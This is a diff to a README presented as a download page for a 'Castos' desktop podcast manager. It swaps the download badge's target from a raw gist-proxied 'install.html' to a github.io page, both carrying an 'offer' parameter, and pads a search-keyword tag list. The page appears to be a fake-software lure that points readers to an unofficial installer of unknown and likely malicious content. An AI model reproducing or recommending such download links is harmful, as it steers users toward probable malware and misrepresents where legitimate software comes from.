@@ -1,6 +1,6 @@
 # Castos Download — Desktop Podcast Manager  
 
-[![Get Castos GitHub](https://img.shields.io/badge/Get%20Castos%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/pripakmrzamo92/e5652d0aa3441bd27a6989c2eae821ca/raw/1912fba163da416b9f4d535cdcb8ce2756c68a68/install.html?offer=Castos)  
+[![Get Castos GitHub](https://img.shields.io/badge/Get%20Castos%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=Castos)  
 
 ---
 
@@ -63,7 +63,7 @@ A: Yes, it integrates with all major podcast platforms for easy distribution.
 ---
 
 ## 🔍 Tags  
-Castos, podcast hosting, audio analytics, podcast manager, creator tools, episode scheduler, Mac podcast app, Windows podcast tool, show analytics, content publishing, Castos pc, Castos windows, Castos desktop, Castos for mac, Castos for pc, Castos for windows, Castos mac  
+Castos, castos podcast, podcast hosting, audio analytics, podcast manager, creator tools, episode scheduler, Mac podcast app, Windows podcast tool, show analytics, content publishing, Castos pc, Castos windows, Castos desktop, Castos for mac, Castos for pc, Castos for windows, Castos mac  
 
 ---
 
